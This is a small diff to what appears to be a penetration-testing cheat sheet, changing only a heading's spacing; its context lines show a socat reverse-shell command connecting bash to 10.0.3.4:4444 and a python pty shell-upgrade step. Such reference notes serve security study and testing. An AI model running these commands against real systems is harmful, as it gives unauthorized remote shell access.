@@ -16,7 +16,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ```
 
-#Using SSTY options
+# Using SSTY options
 ```
 # In reverse shell
 $ python -c 'import pty; pty.spawn("/bin/bash")'
